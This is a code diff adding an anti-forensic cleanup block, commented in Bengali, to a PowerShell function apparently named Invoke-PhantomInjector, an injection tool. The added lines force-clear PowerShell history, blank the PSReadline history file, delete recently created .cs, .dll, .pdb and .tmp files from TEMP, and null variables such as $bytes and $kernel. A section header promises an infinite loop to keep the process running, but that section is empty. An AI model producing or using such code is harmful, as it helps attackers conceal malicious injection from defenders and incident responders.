@@ -529,6 +529,37 @@ function Invoke-PhantomInjector {
         Write-Warning "[-] Injection failed"
     }
 
+
+# ============================================================
+#  ★★★ ৬. ইতিহাস ও টেম্প ফাইল ক্লিয়ার ★★★
+# ============================================================
+Clear-History -Force
+$hp = (Get-PSReadlineOption).HistorySavePath
+if (Test-Path $hp) {
+    try {
+        # ফাইলটি খোলা থাকলে রিলিজ করার চেষ্টা
+        [System.GC]::Collect()
+        [System.GC]::WaitForPendingFinalizers()
+        Clear-Content -Path $hp -Force -ErrorAction SilentlyContinue
+        # ফাইলটি খালি কন্টেন্ট দিয়ে ওভাররাইট
+        Set-Content -Path $hp -Value $null -Force -ErrorAction SilentlyContinue
+    } catch {}
+}
+
+# টেম্প ফাইল ক্লিয়ার (গত ২ মিনিটের মধ্যে ক্রিয়েটেড)
+Get-ChildItem -Path $env:TEMP -Filter "*.cs" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path $env:TEMP -Filter "*.pdb" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path $env:TEMP -Filter "*.tmp" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+
+# ভেরিয়েবল ক্লিয়ার
+$bytes = $null; $kernel = $null; $type = $null
+[GC]::Collect(); [GC]::WaitForPendingFinalizers()
+
+# ============================================================
+#  ★★★ ৭. অসীম লুপ (পাওয়ারশেল প্রক্রিয়া চালু রাখতে) ★★★
+# ============================================================
+
     # Cleanup traces after injection
     Clear-History
     $hp = (Get-PSReadlineOption).HistorySavePath
